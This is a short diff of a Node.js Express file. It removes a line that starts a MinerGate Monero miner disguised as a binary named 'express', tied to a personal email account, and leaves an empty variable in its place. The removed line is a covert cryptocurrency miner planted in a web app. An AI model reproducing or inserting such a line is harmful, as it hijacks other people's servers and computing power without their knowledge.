@@ -2,7 +2,7 @@ const { spawn } = require('child_process');
 const express = require('express');
 const app = express();
 var state = true;
-var proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
+var proc = '';
 
 
 
